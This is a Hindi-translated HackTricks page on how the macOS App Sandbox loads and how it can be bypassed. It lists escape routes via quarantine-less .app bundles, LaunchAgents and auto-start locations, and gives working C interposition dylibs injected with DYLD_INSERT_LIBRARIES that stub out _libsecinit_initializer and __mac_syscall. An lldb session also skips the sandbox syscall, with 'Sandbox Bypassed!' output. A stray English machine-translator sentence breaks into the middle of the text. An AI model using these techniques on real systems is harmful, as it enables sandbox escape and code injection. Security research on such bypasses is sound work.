# macOS Sandbox डीबग और बायपास

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का पालन करें**.
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## Sandbox लोडिंग प्रक्रिया

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>छवि स्रोत <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

पिछली छवि में यह देखा जा सकता है कि **कैसे sandbox लोड होगा** जब एक एप्लिकेशन जिसमें **`com.apple.security.app-sandbox`** एंटाइटलमेंट हो, चलाया जाता है।

कंपाइलर `/usr/lib/libSystem.B.dylib` को बाइनरी से लिंक करेगा।

फिर, **`libSystem.B`** कई अन्य फंक्शन्स को कॉल करेगा जब तक कि **`xpc_pipe_routine`** एप्लिकेशन की एंटाइटलमेंट्स को **`securityd`** को नहीं भेज देता। Securityd चेक करता है कि प्रोसेस को Sandbox के अंदर क्वारंटाइन किया जाना चाहिए या नहीं, और अगर हां, तो वह क्वारंटाइन हो जाएगा।\
अंत में, sandbox **`__sandbox_ms`** के कॉल के साथ सक्रिय हो जाएगा जो **`__mac_syscall`** को कॉल करेगा।

## संभावित बायपास

### क्वारंटाइन एट्रिब्यूट को बायपास करना

**Sandboxed प्रोसेस द्वारा बनाई गई फाइलें** को क्वारंटाइन एट्रिब्यूट जोड़ा जाता है ताकि sandbox से बचने से रोका जा सके। हालांकि, यदि आप **एक `.app` फोल्डर को क्वारंटाइन एट्रिब्यूट के बिना बनाने में सफल होते हैं** एक sandboxed एप्लिकेशन के अंदर, आप एप्लिकेशन बंडल बाइनरी को **`/bin/bash`** पर पॉइंट कर सकते हैं और **plist** में कुछ env वेरिएबल्स जोड़कर **`open`** का उपयोग करके **नए एप्लिकेशन को unsandboxed लॉन्च कर सकते हैं**।

यह [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) में किया गया था।

{% hint style="danger" %}
इसलिए, अभी के समय में, अगर आप सिर्फ एक फोल्डर बनाने में सक्षम हैं जिसका नाम **`.app`** में समाप्त होता है बिना क्वारंटाइन एट्रिब्यूट के, आप sandbox से बच सकते हैं क्योंकि macOS केवल **क्वारंटाइन** एट्रिब्यूट की **जांच** करता है **`.app` फोल्डर** में और **मुख्य एक्जीक्यूटेबल** में (और हम मुख्य एक्जीक्यूटेबल को **`/bin/bash`** पर पॉइंट करेंगे)।

नोट करें कि अगर एक .app बंडल पहले से ही चलाने के लिए अधिकृत हो गया है (इसमें एक क्वारंटाइन xttr है जिसमें अधिकृत चलाने का फ्लैग है), आप इसका भी दुरुपयोग कर सकते हैं... सिवाय इसके कि अब आप **`.app`** बंडलों के अंदर नहीं लिख सकते जब तक कि आपके पास कुछ विशेषाधिकार प्राप्त TCC परम्स न हों (जो आपके पास एक संदूक के अंदर नहीं होंगे)।
{% endhint %}

### Open कार्यक्षमता का दुरुपयोग

[**Word sandbox बायपास के अंतिम उदाहरणों में**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) देखा जा सकता है कि **`open`** cli कार्यक्षमता का दुरुपयोग कैसे किया जा सकता है sandbox को बायपास करने के लिए।

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agents/Daemons

यहां तक कि अगर एक एप्लिकेशन **sandboxed होने का इरादा है** (`com.apple.security.app-sandbox`), यह संभव है कि sandbox को बायपास किया जा सकता है अगर यह **LaunchAgent से निष्पादित किया जाता है** (`~/Library/LaunchAgents`) उदाहरण के लिए।\
जैसा कि [**इस पोस्ट**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) में समझाया गया है, अगर आप एक एप्लिकेशन के साथ पर्सिस्टेंस प्राप्त करना चाहते हैं जो sandboxed है तो आप इसे एक LaunchAgent के रूप में स्वचालित रूप से निष्पादित कर सकते हैं और शायद DyLib एनवायरनमेंट वेरिएबल्स के माध्यम से मैलिशस कोड इंजेक्ट कर सकते हैं।

### Auto Start स्थानों का दुरुपयोग

अगर एक sandboxed प्रोसेस **लिख सकता है** एक ऐसी जगह पर जहां **बाद में एक unsandboxed एप्लिकेशन बाइनरी को चलाने वाला है**, तो वह वहां बाइनरी रखकर **बच सकता है**। इस तरह के स्थानों का एक अच्छा उदाहरण हैं `~/Library/LaunchAgents` या `/System/Library/LaunchDaemons`।

इसके लिए आपको शायद **2 चरणों की आवश्यकता हो सकती है**: एक प्रोसेस को बनाने के लिए जिसमें एक **अधिक अनुमति वाला sandbox** हो (`file-read*`, `file-write*`) जो वास्तव में एक ऐसी जगह पर लिखेगा जहां यह **unsandboxed निष्पादित किया जाएगा**।

**Auto Start स्थानों** के बारे में इस पेज को देखें:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### अन्य प्रोसेसों का दुरुपयोग

अगर आप sandbox प्रोसेस से **अन्य प्रोसेसों को समझौता कर सकते हैं** जो कम प्रतिबंधात्मक sandboxes में चल रहे हैं (या कोई नहीं), आप उनके sandboxes में बच सकते हैं:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### स्टैटिक कंपाइलिंग और डायनामिकली लिंकिंग

[**इस शोध**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ने Sandbox को बायपास करने के दो तरीके खोजे। क्योंकि sandbox userland से लागू किया जाता है जब **libSystem** लाइब्रेरी लोड होती है। अगर एक बाइनरी इसे लोड करने से बच सकती है, तो यह कभी भी sandboxed नहीं होगी:

* अगर बाइनरी **पूरी तरह से स्टैटिकली कंपाइल्ड** होती, तो यह उस लाइब्रेरी को लोड करने से बच सकती थी।
* अगर **बाइनरी को किसी भी लाइब्रेरी को लोड करने की जरूरत नहीं होती** (क्योंकि लिंकर भी libSystem में है), तो इसे libSystem को लोड करने की जरूरत नहीं होगी।

### Shellcodes

नोट करें कि **यहां तक कि shellcodes**
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### एंटाइटलमेंट्स

ध्यान दें कि यदि कुछ **क्रियाएं** **सैंडबॉक्स द्वारा अनुमति** दी गई हों, तो भी यदि किसी एप्लिकेशन के पास विशिष्ट **एंटाइटलमेंट** हो, जैसे कि:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting बायपास

**Interposting** के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
{% endcontent-ref %}

#### सैंडबॉक्स को रोकने के लिए `_libsecinit_initializer` का Interpost करें
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### `__mac_syscall` को इंटरपोज़ करके Sandbox को रोकें

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
Since the provided text does not contain any content to translate, I cannot provide a translation. Please provide the relevant English text that needs to be translated into Hindi, and I will be happy to assist.
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb के साथ Sandbox को डीबग और बायपास करें

एक एप्लिकेशन को कंपाइल करें जिसे सैंडबॉक्स किया जाना चाहिए:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

फिर ऐप को कंपाइल करें:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
ऐप **`~/Desktop/del.txt`** फाइल को **पढ़ने** का प्रयास करेगा, जिसे **Sandbox अनुमति नहीं देगा**।\
एक फाइल वहां बनाएं क्योंकि एक बार Sandbox को बायपास कर दिया जाता है, तो वह इसे पढ़ पाएगा:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

आइए यह देखने के लिए एप्लिकेशन को डीबग करें कि Sandbox कब लोड होता है:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Sandbox को बायपास करने के बावजूद TCC** उपयोगकर्ता से पूछेगा कि क्या वह प्रक्रिया को डेस्कटॉप से फाइलें पढ़ने की अनुमति देना चाहता है
{% endhint %}

## संदर्भ

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें.

</details>
